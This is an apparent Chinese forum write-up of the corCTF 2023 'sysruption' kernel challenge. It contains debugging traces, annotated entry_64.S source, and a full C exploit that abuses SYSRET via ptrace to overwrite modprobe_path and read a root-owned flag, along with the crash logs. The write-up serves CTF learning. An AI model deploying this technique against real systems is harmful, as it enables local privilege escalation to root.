   0xffffffff8109e998 :  lea    rsi,[r8*8+0x70]
   0xffffffff8109e9a0 :  add    r8,0x46
   0xffffffff8109e9a4 :  jmp    0xffffffff8109e9c2 
   0xffffffff8109e9a6 :  cmp    rdi,rcx
   0xffffffff8109e9a9 :  cmove  r10,rax
   0xffffffff8109e9ad :  mov    rax,QWORD PTR [rcx+0x10]
   0xffffffff8109e9b1 :  mov    rcx,QWORD PTR [rax+0x1e0] <==== PAGE FAULT
......

哪这里多半就是rax的值存在问题了，调试跟踪：

$rax   : 0x0
......
   0xffffffff8109e9a6  cmp    rdi, rcx
   0xffffffff8109e9a9  cmove  r10, rax
   0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]
●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
   0xffffffff8109e9b8  mov    r9, QWORD PTR [rax+r8*8+0x8

可以看到这里的rax = 0，所以mov rcx, QWORD PTR [rax+0x1e0]就会出现#PF，而我们向前看的话会发现：

0xffffffff8109e9ad  mov    rax, QWORD PTR [rcx+0x10]

即rax的值为QWORD PTR [rcx + 0x10]：

(remote) gef➤  x/16gx $rcx
0xffffffff8203b6c0:     0xffffffff8203b740      0xffffffff8203b808
0xffffffff8203b6d0:     0x0000000000000000 <== rcx+0x10      0x0000000100000000
0xffffffff8203b6e0:     0x0000000000000000      0xffffffff810c50b3
0xffffffff8203b6f0:     0xffffffff00000018      0xffffffff8203b750
0xffffffff8203b700:     0xffffffff8203b710      0xe1e1c00db29d7d00
0xffffffff8203b710:     0x0000000080050033      0xffffffff81e99724
0xffffffff8203b720:     0x0000000055555554      0x0000000000000000
0xffffffff8203b730:     0x0000000000000001      0xffffffff8203b5c0

而我们来看下正常情况下rcx作为地址处的值：

(remote) gef➤  gef-remox/16gx $rcx
0xffffffff8203b6c0:     0xffff888100049600      0xffffffff82640160
0xffffffff8203b6d0:     0xffffffff8203a320      0x0000002e00000000
0xffffffff8203b6e0:     0x0000000000000000      0x0000000000000000
0xffffffff8203b6f0:     0x0000000000000000      0x0000000000000000
0xffffffff8203b700:     0x0000000000000000      0x0000000000000000
0xffffffff8203b710:     0x0000000000000000      0x0000000000000000
0xffffffff8203b720:     0x0000000000000000      0x0000000000000000
0xffffffff8203b730:     0x0000000000000029      0x0000000000000000

所以这里我们尽量模拟$rcx范围的值不发生改变，正常情况下rcx + 0x20后的值都是 0，其我们可以不用关，主要就是前面的数据。为啥呢？因为这里的目前是防止解引用错误。

而调试发现，0xffffffff8203b6c0这个地址似乎是固定的？所以这里可以直接修改此次的值，当然这里得确认是哪几个寄存器控制这些值。

测试代码：

......
  puts("n[+] do_sysret to fix up");
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = 0xAAAAAAAA + i;
        }
        do_sysret(fix_up + 0xa0, &regs);
        sleep(1);
......

测试结果：

$rax   : 0xaaaaaaad
......
   0xffffffff8109e9a6   cmp    rdi, rcx
   0xffffffff8109e9a9   cmove   r10, rax
   0xffffffff8109e9ad   mov    rax, QWORD PTR [rcx+0x10]
●→ 0xffffffff8109e9b1  mov    rcx, QWORD PTR [rax+0x1e0]
......
(remote) gef➤  x/16gx $rcx
0xffffffff8203b6c0:     0x00000000aaaaaaab      0x00000000aaaaaaac
0xffffffff8203b6d0:     0x00000000aaaaaaad      0x00000001aaaaaaae
0xffffffff8203b6e0:     0x00000000aaaaaaaf      0x0000000000000246
0xffffffff8203b6f0:     0x00000000aaaaaab1      0x00000000aaaaaab2
0xffffffff8203b700:     0x00000000aaaaaab3      0x0000000000000053
0xffffffff8203b710:     0x8000000000000000      0x00000000aaaaaab6
0xffffffff8203b720:     0x00000000aaaaaab7      0x00000000aaaaaab8
0xffffffff8203b730:     0x0000000000000000      0xffffffff81a00191

所以这里第2~4个寄存器即可控制前面 0x20 的数据。

最后exp如下（关闭kaslr）：

#include <stdio.h>
#include 
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>

uint64_t kbase = 0xffffffff81000000;
uint64_t phy_base = 0xffff888000000000;
uint64_t gsbase = 0x13bc00000;
uint64_t modprobe_path = 0x103b840;
uint64_t fix_up = 0x103b6c0;

void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        asm volatile("wrgsbase %0" : : "r" (gsbase));

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    // just needs to be bad (> TASK_MAX) so the value set by wrgsbase isn't overwritten
    regs.gs_base = -1;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}

void pre_get_flag(){
        system("echo -ne '#!/bin/shncp /root/flag.txt /tmp/flag.txtnchown ctf:
ctf /tmp;
        system("chmod +x /tmp/x");
        system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy");
        system("chmod +x /tmp/dummy");
}

void get_flag() {
        system("/tmp/dummy");
        system("cat /tmp/flag.txt");
        exit(0);
}

int main() {

        struct user_regs_struct regs;

        pre_get_flag();

        gsbase += phy_base;
        modprobe_path += kbase;
        fix_up += kbase;

        char str[8] = "/tmp/xx00x00";
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = *((uint64_t*)str);
        }

        puts("n[+] do_sysret to change modprobe_path");
//      getchar();
        do_sysret(modprobe_path + 0x78, &regs);
        sleep(1);

        puts("n[+] do_sysret to fix up");
        for (int i = 0; i < sizeof(regs) / 8; i++) {
                ((uint64_t*)&regs)[i] = 0;
        }

        ((uint64_t*)&regs)[1] = phy_base + 0x100049600;
        ((uint64_t*)&regs)[2] = kbase + 0x1640160;
        ((uint64_t*)&regs)[3] = kbase + 0x103a320;
        ((uint64_t*)&regs)[4] = 0x0000002e00000000;

        do_sysret(fix_up + 0xa0, &regs);
        sleep(1);

        puts("n[+] get_flag");
//      getchar();
        get_flag();
        sleep(1);
        puts("[+] EXP NEVER END");
        return 0;
}

效果如下：

ctf@corctf:~$ ./poc

[+] do_sysret to change modprobe_path
[   54.860622] general protection fault, maybe for address 0x52: 0000 [#1] PREEMPT SMP NOPTI
[   54.863942] CPU: 0 PID: 81 Comm: poc Not tainted 6.3.4 #14
[   54.866204] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   54.869854] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   54.875756] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   54.897567] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   54.900951] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   54.908092] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   54.912087] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   54.916936] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   54.923207] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   54.928403] FS:  0000782f706d742f(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   54.934439] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   54.941481] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
[   54.946718] PKRU: 55555554
[   54.948308] Call Trace:
[   54.950252] Modules linked in:
[   54.952905] ---[ end trace 0000000000000000 ]---
[   54.956570] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   54.959973] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   54.975296] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   54.979096] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   54.983603] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   54.990378] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   54.996204] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   55.000951] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   55.006682] FS:  0000782f706d742f(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   55.012856] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   55.015931] CR2: 0000000000c72840 CR3: 0000000100acc003 CR4: 0000000000770ef0
[   55.022360] PKRU: 55555554
[   55.024861] note: poc[81] exited with irqs disabled

[+] do_sysret to fix up
[   55.870690] general protection fault
[   55.873686] general protection fault, maybe for address 0x54: 0000 [#2] PREEMPT SMP NOPTI
[   55.881308] CPU: 0 PID: 83 Comm: poc Tainted: G      D            6.3.4 #14
[   55.883938] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   55.889846] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   55.894069] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   55.911307] RSP: 0018:
ffffffff8203b760 EFLAGS: 00010046
[   55.915745] RAX: 0000000000000054 RBX: 0000000000000000 RCX: 8000000000000000
[   55.922827] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000000
[   55.927877] RBP: 0000002e00000000 R08: 0000000000000000 R09: 0000000000000000
[   55.934469] R10: 0000000000000000 R11: 0000000000000246 R12: ffffffff8203a320
[   55.939055] R13: ffffffff82640160 R14: ffff888100049600 R15: 0000000000000000
[   55.944725] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   55.950507] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   55.953619] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
[   55.957433] PKRU: 55555554
[   55.958668] Call Trace:
[   55.960963] Modules linked in:
[   55.964387] ---[ end trace 0000000000000000 ]---
[   55.968013] RIP: 0010:
entry_SYSRETQ_unsafe_stack+0x3/0x6
[   55.971660] Code: 3c 25 d6 0f 02 00 48 89 c7 eb 08 48 89 c7 48 0f ba ef 3f 48 81 cf 00 08 00 00 48 81 cf 00 10 00 00 0f 22 df 58 5f 5c 0f 01 f8 <48> 0f 07 cc 66 66 2e 0f 1f 84 08
[   55.986549] RSP: 0018:
ffffffff8203b8b8 EFLAGS: 00010046
[   55.991037] RAX: 0000000000000052 RBX: 0000782f706d742f RCX: 8000000000000000
[   55.995083] RDX: 0000782f706d742f RSI: 0000782f706d742f RDI: 0000782f706d742f
[   56.001529] RBP: 0000782f706d742f R08: 0000782f706d742f R09: 0000782f706d742f
[   56.006144] R10: 0000782f706d742f R11: 0000000000000246 R12: 0000782f706d742f
[   56.012928] R13: 0000782f706d742f R14: 0000782f706d742f R15: 0000782f706d742f
[   56.019846] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
ffff88813bc00000
[   56.025685] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.031767] CR2: 0000000000c72840 CR3: 0000000100acc006 CR4: 0000000000770ef0
[   56.039399] PKRU: 55555554
[   56.041014] note: poc[83] exited with irqs disabled

[+] get_flag
[   56.889309] ------------[ cut here ]------------
[   56.894489] WARNING: CPU: 0 PID: 27 at kernel/ucount.c:
285 dec_rlimit_ucounts+0x4f/0x60
[   56.905581] Modules linked in:
[   56.908304] CPU: 0 PID: 27 Comm: kworker/u2:1 Tainted: G      D            6.3.4 #14
[   56.915819] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   56.920894] Workqueue: events_unbound call_usermodehelper_exec_work
[   56.925990] RIP: 0010:
dec_rlimit_ucounts+0x4f/0x60
[   56.931058] Code: c1 04 31 48 29 d0 78 22 48 39 cf 4c 0f 44 c0 48 8b 41 10 48 8b 88 e0 01 00 00 48 85 c9 75 db 4d 85 c0 0f 94 c0 c3 cc cc cc cc <0f> 0b eb da 31 c0 c3 cc cc cc c0
[   56.948338] RSP: 0018:
ffffc900000e3d00 EFLAGS: 00010297
[   56.951704] RAX: ffffffffffffffff RBX: ffffc900000e3e08 RCX: ffffffff8203b6c0
[   56.957035] RDX: 0000000000000001 RSI: 0000000000000070 RDI: ffffffff8203b6c0
[   56.961815] RBP: ffff88810103c140 R08: ffffffffffffffff R09: ffffffffffffffff
[   56.968173] R10: 00000000000000bb R11: 00000000000009e9 R12: ffffffff8203b6c0
[   56.972953] R13: 0000000000000010 R14: dead000000000122 R15: 0000000000000000
[   56.979591] FS:  0000000000000000(0000) GS:
ffff88813bc00000(0000) knlGS:
0000000000000000
[   56.987164] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   56.991283] CR2: 000000000065eff0 CR3: 000000000202c006 CR4: 0000000000770ef0
[   56.998861] PKRU: 55555554
[   57.002433] Call Trace:
[   57.005565]  <TASK>
[   57.007367]  release_task+0x47/0x4b0
[   57.011674]  ? thread_group_cputime_adjusted+0x46/0x70
[   57.017727]  wait_consider_task+0x90d/0x9e0
[   57.020530]  do_wait+0x17b/0x2c0
[   57.022370]  kernel_wait+0x44/0x90
[   57.024532]  ? __pfx_child_wait_callback+0x10/0x10
[   57.027662]  call_usermodehelper_exec_work+0x72/0x80
[   57.033738]  process_one_work+0x1b1/0x340
[   57.037279]  worker_thread+0x45/0x3b0
[   57.039978]  ? __pfx_worker_thread+0x10/0x10
[   57.043033]  kthread+0xd1/0x100
[   57.046609]  ? __pfx_kthread+0x10/0x10
[   57.050986]  ret_from_fork+0x29/0x50
[   57.054256]  </TASK>
[   57.055543] ---[ end trace 0000000000000000 ]---
/tmp/dummy: line 1: ����: not found
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs ma}
[   57.084675] poc (76) used greatest stack depth: 13768 bytes left
ctf@corctf:~$ cat /tmp/flag.txt
corctf{tHIS is a SoFtWare ImPLEMENTAtioN isSuE. iNTeL PRoCESSORS ArE fuNCtIONinG AS PEr sPeCiFIcaTionS anD ThIS BEHavioR Is cORRecTly documEnteD IN tHE INTEL SofTwArE DEvELOPErs ma}
ctf@corctf:~$

开启kaslr时，利用预取指令侧信道即可泄漏kbase和phy_base，这里就不再赘述了。

四

调试技巧

这里分享一个小的调试技巧，就是当我调试exp时，发现无法插入断点：

(remote) gef➤  c
Continuing.
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x401d05

Command aborted.

这时我们可以添加一个getchar，并直接将目标位置的地址给打印出来：

int main() {

        char RSP[0x3000] = { 0 };

        struct user_regs_struct regs;
        printf("%#pn", RSP);
        printf("%#pn", do_sysret); // <=== 打印预下断点位置的地址
        getchar();     // stop stop
        do_sysret(RSP + 0x1000, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}

这样程序就会停下来接收我们的输入，这时直接Ctrl + c然后在目标位置do_sysret下断点即可。

五

总结

首先感谢FizzBuzz101出的这么好的题目；然后也非常感谢zolutal通俗易懂的题解。总的来说是一次不错的体验，也让我认识到了自己的不足，kernel的利用不仅仅在于”堆”和各种结构体。从之前的hxpctf one_byte的利用调用门提权到corctf sysruption的sysret bug，学到了很多底层相关东西，也希望今后自己能够打好基础，对底层相关原理有更深的理解。

参考：

zolutal: corCTF 2023: sysruption writeup

（https://zolutal.github.io/corctf-sysruption/）

Will's Root: corCTF 2023 sysruption - Exploiting Sysret on Linux in 2023

（https://www.willsroot.io/2023/08/sysruption.html）

SYSRET — Return From Fast System Call

（https://www.felixcloutier.com/x86/sysret）

Vitaly Nikolenko: CVE-2014-4699: Linux Kernel ptrace/sysret vulnerability analysis

（https://duasynt.com/blog/cve-2014-4699-linux-kernel-ptrace-sysret-analysis）

entry_SYSCALL_64 source code

（https://elixir.bootlin.com/linux/v6.3.4/source/arch/x86/entry/entry_64.S）

THE INTEL SYSRET PRIVILEGE ESCALATION

（https://xenproject.org/2012/06/13/the-intel-sysret-privilege-escalation/）

看雪ID：XiaozaYa

https://bbs.kanxue.com/user-home-965217.htm

*本文为看雪论坛优秀文章，由 XiaozaYa 原创，转载请注明来自看雪社区

# 往期推荐

1、winrar(CVE-2023-38831)漏洞原理

2、ELF文件脱壳纪事

3、Glibc-2.35下对tls_dtor_list的利用详解

4、对旅行APP的检测以及参数计算分析【Simplesign篇】

5、2023强网杯warmup题解

6、Directory Opus 13.2 逆向分析

球分享

球点赞

球在看

点击阅读原文查看更多


```
一
前言
二
漏洞分析
#!/bin/sh
qemu-system-x86_64 
    -m 4096M 
    -smp 1 
    -nographic 
    -kernel "./bzImage" 
    -append "console=ttyS0 loglevel=3 panic=-1 pti=off kaslr" 
    -no-reboot 
    -monitor /dev/null 
    -cpu host 
    -netdev user,id=net 
    -device e1000,netdev=net 
    -initrd "./initramfs.cpio.gz" 
    -enable-kvm
--- orig_entry_64.S
+++ linux-6.3.4/arch/x86/entry/entry_64.S
@@ -150,13 +150,13 @@
        ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", 
                "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
 #else
-       shl     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
-       sar     $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # shl   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
+       # sar   $(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
 #endif

        /* If this changed %rcx, it was not canonical */
-       cmpq    %rcx, %r11
-       jne     swapgs_restore_regs_and_return_to_usermode
+       # cmpq  %rcx, %r11
+       # jne   swapgs_restore_regs_and_return_to_usermode

        cmpq    $__USER_CS, CS(%rsp)            /* CS must match SYSRET */
        jne     swapgs_restore_regs_and_return_to_usermode
/*
  * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
  * in kernel space.  This essentially lets the user take over
  * the kernel, since userspace controls RSP.
  *
  * If width of "canonical tail" ever becomes variable, this will need
  * to be updated to remain correct on both old and new CPUs.
  *
  * Change top bits to match most significant bit (47th or 56th bit
  * depending on paging mode) in the address.
  */
/*
 * 64-bit SYSCALL instruction entry. Up to 6 arguments in registers.
 * 64-bit 的 syscall 指令入口，最多 6 个寄存器参数
 *
 * This is the only entry point used for 64-bit system calls.  The
 * hardware interface is reasonably well designed and the register to
 * argument mapping Linux uses fits well with the registers that are
 * available when SYSCALL is used.
 * 这是 64-bit 系统调用的唯一入口点
 *
 * SYSCALL instructions can be found inlined in libc implementations as
 * well as some other programs and libraries.  There are also a handful
 * of SYSCALL instructions in the vDSO used, for example, as a
 * clock_gettimeofday fallback.
 *
 * 64-bit SYSCALL saves rip to rcx, clears rflags.RF, then saves rflags to r11,
 * then loads new ss, cs, and rip from previously programmed MSRs.
 * rflags gets masked by a value from another MSR (so CLD and CLAC
 * are not needed). SYSCALL does not save anything on the stack
 * and does not change rsp.
 * 64-bit syscall 保持 rip 到 rcx 中，并清除 rflags.RF 标志位，然后保存 rflags 到 r11 中
 * 然后从 MSR 寄存器组中加载新的 ss、cs 和 rip，rflags 的一些标志位会被清除
 * syscall 不在栈上保存任何值并且不会改变 rsp
 *
 * Registers on en
try:
 * 下面是 syscall 使用的一些寄存器
 * rax  system call number  系统调用号
 * rcx  return address 返回地址
 * r11  saved rflags (note: r11 is callee-clobbered register in C ABI) rflags
 * rdi  arg0	6个参数寄存器
 * rsi  arg1
 * rdx  arg2
 * r10  arg3 (needs to be moved to rcx to conform to C ABI)
 * r8   arg4
 * r9   arg5
 * (note: r12-r15, rbp, rbx are callee-preserved in C ABI)
 *
 * Only called from user space.
 *
 * When user can change pt_regs->foo always force IRET. That is because
 * it deals with uncanonical addresses better. SYSRET has trouble
 * with them due to bugs in both AMD and Intel CPUs.
 * 这段话的意思简而言之就是：
 * 当处理 non canonical address 时，用 iret 返回
 * 否则使用 sysret 返回，因为 sysret 更快
 */

SYM_CODE_START(entry_SYSCALL_64)
	UNWIND_HINT_ENTRY
	ENDBR

	swapgs	/* 切换 gs [gsbase] 为内核态 gs */
	/* tss.sp2 is scratch space. */
	movq	%rsp, PER_CPU_VAR(cpu_tss_rw + TSS_sp2) /* 保存 rsp */
	SWITCH_TO_KERNEL_CR3 scratch_reg=%rsp  /* 切换页表，cr3 寄存器保存的是顶层目录项的基地址*/
	movq	PER_CPU_VAR(pcpu_hot + X86_top_of_stack), %rsp /* 切换栈帧，可以引证 syscall 不改变 rsp */

SYM_INNER_LABEL(entry_SYSCALL_64_safe_stack, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	/* 下面就是依次压栈寄存器了，其实就是在栈上构造一个 pt_regs 结构体 */
	/* Construct struct pt_regs on stack */
	pushq	$__USER_DS /* pt_regs->ss */
	pushq	PER_CPU_VAR(cpu_tss_rw + TSS_sp2)	/* pt_regs->sp */
	pushq	%r11 /* pt_regs->flags */
	pushq	$__USER_CS /* pt_regs->cs */
	pushq	%rcx /* pt_regs->ip */
SYM_INNER_LABEL(entry_SYSCALL_64_after_hwframe, SYM_L_GLOBAL)
	pushq	%rax /* pt_regs->orig_ax */

	PUSH_AND_CLEAR_REGS rax=$-ENOSYS /* 这里会把其它寄存器压栈，并且会把寄存器的值清零*/

	/* IRQs are off. */
	/* 下面设置的 rdi/rsi 是 do_syscall_64 函数的两个参数 */
	/* rdi 保存的就是栈上 pt_regs 的地址 */
	movq	%rsp, %rdi
	/* Sign extend the lower 32bit as syscall numbers are treated as int */
	/* rsi 保存的是系统调用号 */
	movslq	%eax, %rsi

	/* clobbers %rax, make sure it is after saving the syscall nr */
	IBRS_ENTER
	UNTRAIN_RET
	/* 去执行相应的功能 */
	call	do_syscall_64 /* returns with IRQs disabled */

	/*
	 * Try to use SYSRET instead of IRET if we're returning to
	 * a completely clean 64-bit userspace context.  If we're not,
	 * go to the slow exit path.
	 * In the Xen PV case we must use iret anyway.
	 * 这里会尝试使用 sysret 返回而不是 iret，利用就是 sysret 更快
	 */

	ALTERNATIVE "", "jmp	swapgs_restore_regs_and_return_to_usermode", 
 X86_FEATURE_XENPV
	/* rcx r11 都是返回地址的值 */
	movq	RCX(%rsp), %rcx
	movq	RIP(%rsp), %r11
    /* 检查两个值是否相等 */
	cmpq	%rcx, %r11	/* SYSRET requires RCX == RIP */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * On Intel CPUs, SYSRET with non-canonical RCX/RIP will #GP
	 * in kernel space.  This essentially lets the user take over
	 * the kernel, since userspace controls RSP.
	 *
	 * If width of "canonical tail" ever becomes variable, this will need
	 * to be updated to remain correct on both old and new CPUs.
	 *
	 * Change top bits to match most significant bit (47th or 56th bit
	 * depending on paging mode) in the address.
	 */
    #ifdef CONFIG_X86_5LEVEL
	ALTERNATIVE "shl $(64 - 48), %rcx; sar $(64 - 48), %rcx", 
 "shl $(64 - 57), %rcx; sar $(64 - 57), %rcx", X86_FEATURE_LA57
    #else
	/* canonical address 检查 */
	shl	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
	sar	$(64 - (__VIRTUAL_MASK_SHIFT+1)), %rcx
    #endif

	/* If this changed %rcx, it was not canonical */
	cmpq	%rcx, %r11
	jne	swapgs_restore_regs_and_return_to_usermode
	/* 检查 cs */
	cmpq	$__USER_CS, CS(%rsp) /* CS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode
	/* 检查 rflags */
	movq	R11(%rsp), %r11
	cmpq	%r11, EFLAGS(%rsp) /* R11 == RFLAGS */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * SYSCALL clears RF when it saves RFLAGS in R11 and SYSRET cannot
	 * restore RF properly. If the slowpath sets it for whatever reason, we
	 * need to restore it correctly.
	 *
	 * SYSRET can restore TF, but unlike IRET, restoring TF results in a
	 * trap from userspace immediately after SYSRET.  This would cause an
	 * infinite loop whenever #DB happens with register state that satisfies
	 * the opportunistic SYSRET conditions.  For example, single-stepping
	 * this user code:
	 *
	 *           movq	$stuck_here, %rcx
	 *           pushfq
	 *           popq %r11
	 *   stuck_here:
	 *
	 * would never get past 'stuck_here'.
	 */
	/* 这里看上面注释，简单来说 sysret 不能恢复某些 rflags 的标志位 */
	testq	$(X86_EFLAGS_RF|X86_EFLAGS_TF), %r11
	jnz	swapgs_restore_regs_and_return_to_usermode

	/* nothing to check for RSP */
	/* 可以看到，这里没有检查 rsp */
	/* 检查 ss */
	cmpq	$__USER_DS, SS(%rsp) /* SS must match SYSRET */
	jne	swapgs_restore_regs_and_return_to_usermode

	/*
	 * We win! This label is here just for ease of understanding
	 * perf profiles. Nothing jumps here.
	 */
	/* 下面就是 sysret 返回逻辑 */
syscall_return_via_sysret:
	IBRS_EXIT
	POP_REGS pop_rdi=0 /* 恢复相关寄存器的值，这里可以调试看更明显 */

	/*
	 * Now all regs are restored 
except RSP and RDI.
	 * Save old stack pointer and switch to trampoline stack.
	 */
	movq	%rsp, %rdi
	movq	PER_CPU_VAR(cpu_tss_rw + TSS_sp0), %rsp /* 切换到内核栈 */
	UNWIND_HINT_EMPTY

	pushq	RSP-RDI(%rdi)	/* RSP */
	pushq	(%rdi) /* RDI */

	/*
	 * We are on the trampoline stack.  All regs 
except RDI are live.
	 * We can do future final exit work right here.
	 */
	STACKLEAK_ERASE_NOCLOBBER

	SWITCH_TO_USER_CR3_STACK scratch_reg=%rdi

	popq	%rdi /* 这里保存的返回值*/
	popq	%rsp /* 恢复 rsp */
SYM_INNER_LABEL(entry_SYSRETQ_unsafe_stack, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	swapgs /* 切换 gs 为用户态 gs */
	sysretq /* sysretq 返回 */
SYM_INNER_LABEL(entry_SYSRETQ_end, SYM_L_GLOBAL)
	ANNOTATE_NOENDBR
	int3
SYM_CODE_END(entry_SYSCALL_64)
------------------ INTEL -------------------|-------------------  AMD ----------------------
...                                         | ...
IF (operand size is 64-bit)                 | SYSRET_64BIT_MODE:
    THEN (* Return to 64-Bit Mode *)        | IF (OPERAND_SIZE == 64) {
    IF (RCX is not canonical) THEN #GP(0);  | {
        RIP := RCX;                         |      CS.sel = (MSR_STAR.SYSRET_CS + 16) OR 3
    ELSE (* Return to Compatibility Mode *) |      ...
        RIP := ECX;                         | }
FI;                                         | ...
...                                         | RIP = temp_RIP
CS.Selector := CS.Selector OR 3;            | EXIT
            (* RPL forced to 3 *)           |
...                                         |
三
漏洞利用
Most ptrace paths go via the interface that catches the process using the signal handler which always returns with IRET. However, there are a few paths that can get caught with ptrace_event() instaed of the signal path. Refer to the PoC code for an example of using fork() with ptrace to force such a path.
void do_sysret(uint64_t addr, struct user_regs_struct *regs_arg) {
    struct user_regs_struct regs;
    int status;
    pid_t chld;

    memcpy(&regs, regs_arg, sizeof(regs));

    if ((chld = fork()) < 0) {
        perror("fork");
        exit(1);
    }

    if (chld == 0) {
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
            perror("PTRACE_TRACEME");
            exit(1);
        }

        raise(SIGSTOP);
        fork();
        return 0;
    }

    waitpid(chld, &status, 0);

    ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK);
    ptrace(PTRACE_CONT, chld, 0, 0);

    waitpid(chld, &status, 0);

    regs.rip = 0x8000000000000000; // not-canonical
    regs.rcx = 0x8000000000000000; // not-canonical
    regs.rsp = addr;

    // necessary stuff
    regs.eflags = 0x246;
    regs.r11 = 0x246;
    regs.ss = 0x2b;
    regs.cs = 0x33;

    ptrace(PTRACE_SETREGS, chld, NULL, &regs);
    ptrace(PTRACE_CONT, chld, 0, 0);
    ptrace(PTRACE_DETACH, chld, 0, 0);
}
int main() {

        struct user_regs_struct regs;

        do_sysret(0xdeadbeef, &regs);
        sleep(1);

        puts("[+] EXP NEVER END");
        return 0;
}
ctf@corctf:~$ ./poc
[   10.018563] traps: PANIC: double fault, error_code: 0x0
[   10.018619] double fault: 0000 [#1] PREEMPT SMP NOPTI
[   10.018658] CPU: 0 PID: 77 Comm: poc Not tainted 6.3.4 #14
